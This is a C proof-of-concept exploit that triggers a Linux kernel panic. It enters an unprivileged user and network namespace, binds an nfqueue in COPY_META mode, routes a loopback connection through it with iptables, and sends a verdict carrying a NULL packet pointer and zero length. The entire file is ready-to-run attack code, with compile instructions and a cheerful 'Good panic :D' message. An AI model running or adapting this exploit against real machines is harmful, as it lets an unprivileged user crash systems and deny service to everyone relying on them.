#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <linux/netfilter/nfnetlink_queue.h>
#include <libnetfilter_queue/libnetfilter_queue.h>
#include <linux/netfilter/nfnetlink_conntrack.h>
#include <libmnl/libmnl.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/types.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <string.h>
#include <assert.h>

// How to compile:
// cc panic6.c -o nfpanic -lmnl -lnetfilter_queue && sudo setcap "CAP_NET_ADMIN+ep" ./nfpanic && ./nfpanic

int socket_conn(uint16_t port)
{
	int sockfd, connfd;
	struct sockaddr_in servaddr, cli;

	// socket create and verification
	sockfd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
	if (sockfd == -1)
	{
		assert(0 && "socket creation failed");
	}
	bzero(&servaddr, sizeof(servaddr));

	// assign IP, PORT
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
	servaddr.sin_port = htons(port);

	// connect the client socket to server socket
	connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr));
	return sockfd;
}

void write_file(const char *fn, char *content)
{
	FILE *fptr;

	// use appropriate location if you are using MacOS or Linux
	fptr = fopen(fn, "w");

	if (fptr == NULL)
	{
		assert(0 && "Set user namespace failed!");
	}

	fprintf(fptr, "%s", content);
	fclose(fptr);
}

int main(int argc, char *argv[])
{

	uid_t user = geteuid();
	uid_t group = getegid();

	puts("[*] Creating a network namespace");
	if (unshare(CLONE_NEWUSER | CLONE_NEWNET) != 0)
	{
		assert(0 && "Couldn't create user namespace. Probably user namespaces are not enabled.");
	}

	puts("[*] Becoming 'root' in the namespace");
	char tmp_buf[50];
	sprintf(tmp_buf, "0 %d 1", user);
	write_file("/proc/self/uid_map", tmp_buf);
	write_file("/proc/self/setgroups", "deny");
	sprintf(tmp_buf, "0 %d 1", group);
	write_file("/proc/self/gid_map", tmp_buf);

	puts("[*] Enabling loopback inferface in the namespace");
  pid_t pid = fork();
  if (pid != 0) { 
    wait(&pid);
  } else {
  	if (execl("./ld-linux.so.1","./ld-linux.so.1", "./ip", "link", "set", "dev", "lo", "up", NULL) != 0)
    {
      assert(0 && "ip link set dev lo up");
    }
  }

	size_t BUF_SIZE = 0xffff + (MNL_SOCKET_BUFFER_SIZE / 2);
	char buf[BUF_SIZE];
	uint16_t queue_num = 1337;
	struct nlmsghdr *nlh;

	puts("[*] Creating the socket with the kernel");
	struct mnl_socket *nl = mnl_socket_open(NETLINK_NETFILTER);
	if (nl == NULL)
	{
		assert(0 && "mnl_socket_open");
		
	}
	puts("[*] Binding the socket");
	if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0)
	{
		assert(0 && "mnl_socket_bind");
	}

	printf("[*] Sending the BIND command for the nfqueue %d\n", queue_num);
	nlh = nfq_nlmsg_put(buf, NFQNL_MSG_CONFIG, queue_num);
	nfq_nlmsg_cfg_put_cmd(nlh, AF_INET, NFQNL_CFG_CMD_BIND);
	if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0)
	{
		assert(0 && "mnl_socket_send");
	}

	puts("[*] Setting config to COPY_META mode");
	nlh = nfq_nlmsg_put(buf, NFQNL_MSG_CONFIG, queue_num);
	nfq_nlmsg_cfg_put_params(nlh, NFQNL_COPY_META, 0xffff);
	mnl_attr_put_u32(nlh, NFQA_CFG_FLAGS, htonl(NFQA_CFG_F_GSO));
	mnl_attr_put_u32(nlh, NFQA_CFG_MASK, htonl(NFQA_CFG_F_GSO));
	if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0)
	{
		assert(0 && "mnl_socket_send");
	}

	puts("[*] Linking the nfqueue to a real connection through iptables");
	sprintf(tmp_buf, "%d", queue_num);
  pid = fork();
  if (pid != 0) { 
    wait(&pid);
  } else {
    if (execl("./ld-linux.so.1", "./ld-linux.so.1","./iptables", "-t", "mangle", "-A", "PREROUTING", "-j", "NFQUEUE", "-p", "tcp","--dport", "1337", "--queue-num", tmp_buf, NULL) != 0)
    {
      assert(0 && "iptables config failed. Probably nfqueue module is missing.");
    }
	}

	puts("[*] Sending a connection packet to nfqueue");
	socket_conn(1337);
	puts("[*] Waiting for a packet in the nfqueue");
	if (mnl_socket_recvfrom(nl, buf, BUF_SIZE) == -1)
	{
		assert(0 && "mnl_socket_recvfrom");
	}

	puts("[*] Setting the verdict with a NULL pointer and len = 0");
	nlh = nfq_nlmsg_put(buf, NFQNL_MSG_VERDICT, queue_num);
	nfq_nlmsg_verdict_put_pkt(nlh, NULL, 0);
	nfq_nlmsg_verdict_put(nlh, 1, NF_ACCEPT);

	puts("[*] Sending the verdict to the kernel, Good panic :D");
	sleep(1); // Only to see the print
	if (mnl_socket_sendto(nl, nlh, nlh->nlmsg_len) < 0)
	{
		assert(0 && "mnl_socket_send");
	}

	puts("[*] Are you still alive? Probably your kernel is not vulnerable :(");
	return EXIT_SUCCESS;
}
